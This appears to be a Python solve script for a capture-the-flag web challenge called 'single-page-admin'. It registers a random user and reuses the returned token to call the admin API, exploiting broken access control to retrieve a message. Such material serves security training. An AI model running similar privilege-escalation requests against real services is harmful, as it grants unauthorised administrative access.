import requests
import os

URL="https://single-page-admin.challs.olicyber.it/"

res = requests.post(f'{URL}/api/register', json={
    'username': os.urandom(16).hex()
})

res = requests.post(f'{URL}/api/admin', headers={
    'Authorization': f'Bearer {res.json()["token"]}'
})
print(res.json()['message'])